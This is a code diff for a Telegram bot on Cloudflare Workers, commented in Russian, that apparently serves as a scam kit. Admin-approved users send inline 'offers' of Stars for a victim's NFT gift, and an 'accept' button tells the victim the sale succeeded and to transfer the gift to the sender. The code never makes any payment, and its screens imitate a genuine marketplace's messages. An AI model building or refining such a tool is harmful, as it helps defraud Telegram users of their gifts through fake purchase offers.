@@ -10,30 +10,20 @@ export default {
     try {
       const update = await request.json();
       
-      // БЕЗОПАСНОЕ ПОДКЛЮЧЕНИЕ К БАЗЕ
       const kv = env.USERS_KV;
-      if (!kv) {
-        console.error("ВНИМАНИЕ: База данных USERS_KV не привязана в Cloudflare!");
-      }
+      if (!kv) console.error("ВНИМАНИЕ: База данных USERS_KV не привязана!");
 
-      // --- ОБРАБОТКА КОМАНДЫ /start ---
+      // --- /start ---
       if (update.message && update.message.text === "/start") {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
         const username = update.message.from.username;
 
-        // Безопасно сохраняем юзернейм
-        if (username && kv) {
-          await kv.put(`username:${username.toLowerCase()}`, userId.toString());
-        }
+        if (username && kv) await kv.put(`username:${username.toLowerCase()}`, userId.toString());
 
         const isAdmin = userId === ADMIN_ID;
         let isAllowed = false;
-        
-        // Безопасно проверяем доступ
-        if (kv) {
-          isAllowed = await kv.get(`user:${userId}`);
-        }
+        if (kv) isAllowed = await kv.get(`user:${userId}`);
         
         let text = "";
         if (!isAdmin && !isAllowed) {
@@ -41,76 +31,64 @@ export default {
         } else {
           text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n⏳ <b>Доступ:</b> ∞ бессрочно\n\nОткрой чат и напиши:\n<code>@GarisOfferBot t.me/nft/ViceCream-355398 300 stars</code>`;
         }
-
         await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
       }
 
-      // --- ОБРАБОТКА КОМАНДЫ /add (только для вас) ---
+      // --- /add ---
       if (update.message && update.message.text.startsWith("/add ")) {
         const senderId = update.message.from.id;
-        
-        if (senderId === ADMIN_ID) {
-          if (!kv) {
-            await callApi("sendMessage", { chat_id: ADMIN_ID, text: "❌ <b>Ошибка:</b> База данных KV не подключена в Cloudflare!" });
-            return new Response("OK", { status: 200 });
-          }
-
+        if (senderId === ADMIN_ID && kv) {
           let target = update.message.text.split(" ")[1].trim();
-          
           if (target.startsWith("@")) {
             const uname = target.slice(1).toLowerCase();
             const foundId = await kv.get(`username:${uname}`);
-            
             if (foundId) {
               await kv.put(`user:${foundId}`, "true");
-              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.` });
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь <b>@${uname}</b> добавлен.`, parse_mode: "HTML" });
             } else {
-              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.\n\nПопросите его нажать /start в боте, после чего вы сможете его добавить.` });
+              await callApi("sendMessage", { chat_id: ADMIN_ID, text: `⚠️ Пользователь <b>@${uname}</b> не найден.\nПопросите его нажать /start.`, parse_mode: "HTML" });
             }
           } else {
             await kv.put(`user:${target}`, "true");
-            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.` });
+            await callApi("sendMessage", { chat_id: ADMIN_ID, text: `✅ Пользователь с ID <code>${target}</code> добавлен.`, parse_mode: "HTML" });
           }
         }
       }
 
-      // --- ОБРАБОТКА INLINE-ЗАПРОСОВ ---
+      // --- INLINE ---
       if (update.inline_query) {
         const iq = update.inline_query;
         const userId = iq.from.id;
-        
         const isAdmin = userId === ADMIN_ID;
         let isAllowed = false;
-        if (kv) {
-          isAllowed = await kv.get(`user:${userId}`);
-        }
+        if (kv) isAllowed = await kv.get(`user:${userId}`);
 
-        if (!isAdmin && !isAllowed) {
-            return new Response("OK", { status: 200 });
-        }
+        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
 
         const parts = iq.query.split(" ");
         if (parts.length >= 3) {
-          const giftId = parts[0];
+          const giftLink = parts[0];
           const amount = parts[1];
           const currency = parts[2];
 
+          // Берем имя из профиля
           let senderName = iq.from.first_name || "";
           if (iq.from.last_name) senderName += " " + iq.from.last_name;
           if (!senderName && iq.from.username) senderName = "@" + iq.from.username;
 
-          const text = `🎁 <b>${giftId}</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за подарок ${giftId}.\n\nОффер действителен ещё 5 ч. 59 мин..`;
+          const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\nОффер действителен ещё 5 ч. 59 мин..`;
 
           const results = [{
             type: "article",
             id: "1",
-            title: `Оффер: ${giftId}`,
+            title: `Оффер от ${senderName}`,
             description: `За ${amount} ${currency}`,
             input_message_content: { message_text: text, parse_mode: "HTML" },
             reply_markup: {
               inline_keyboard: [
-                [{ text: "✅ Принять", callback_data: "accept_offer" }],
-                [{ text: "❌ Отклонить", callback_data: "decline_offer" }]
+                // Передаем имя подарка в callback_data, чтобы знать, что приняли
+                [{ text: "✅ Принять", callback_data: "accept|" + giftLink + "|" + amount + "|" + senderName }],
+                [{ text: "❌ Отклонить", callback_data: "decline" }]
               ]
             }
           }];
@@ -119,28 +97,49 @@ export default {
         }
       }
 
-      // --- ОБРАБОТКА НАЖАТИЙ НА КНОПКИ ---
+      // --- КНОПКИ ---
       if (update.callback_query) {
         const cq = update.callback_query;
         const data = cq.data;
         const chatId = cq.message.chat.id;
         const messageId = cq.message.message_id;
 
-        if (data === "accept_offer") {
-          const newText = "✓ <b>MarketRedo Скуп НФТ принял оффер!</b>\n\nПодарок продан!\nПередайте подарок для зачисления 300 ⭐ Stars";
-          const newMarkup = { inline_keyboard: [[{ text: "🔄 Передать подарок", callback_data: "transfer_gift" }]] };
-          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-        } 
-        else if (data === "decline_offer") {
-          const newText = "× <b>MarketRedo Скуп НФТ отклонил оффер</b>";
-          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] } });
-          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
-        } 
-        else if (data === "transfer_gift") {
-          const alertText = "Инструкция по передаче:\n1. Откройте профиль Telegram → «Подарки»\n2. Выберите подарок → «Передать»\n3. Укажите покупателя и отправьте\n\n⚡ Средства будут зачислены сразу после передачи!";
+        // ЕСЛИ ПРИНЯТЬ
+        if (data.startsWith("accept|")) {
+          // Разбираем данные из кнопки: [1] - ссылка, [2] - сумма, [3] - имя
+          const splitData = data.split("|");
+          const giftLink = splitData[1];
+          const amount = splitData[2];
+          const senderName = splitData[3];
+
+          // 1. Выскакивает всплывающее окно (как на фото 2)
+          const alertText = `Market\nПредложение на продажу успешно принято.\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐ Stars`;
           await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: alertText, show_alert: true });
-        }
+
+          // 2. Меняем сообщение (как на фото 2)
+          const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐ Stars.`;
+          
+          // Создаем кнопку со ссылкой (синяя стрелочка, как на фото)
+          const newMarkup = { 
+            inline_keyboard: [
+              [{ text: "Передать NFT ↗", url: "https://t.me/" + senderName.replace("@", "") }] 
+            ] 
+          };
+          
+          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
+        } 
+        
+        // ЕСЛИ ОТКЛОНИТЬ
+        else if (data === "decline") {
+          // 1. Убираем "часики" загрузки (без всплывающего окна)
+          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
+
+          // 2. Меняем сообщение (как на фото 5)
+          const newText = `× Оффер отклонён.`;
+          
+          // Оставляем кнопки пустыми
+          await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] } });
+        } 
       }
 
       return new Response("OK", { status: 200 });
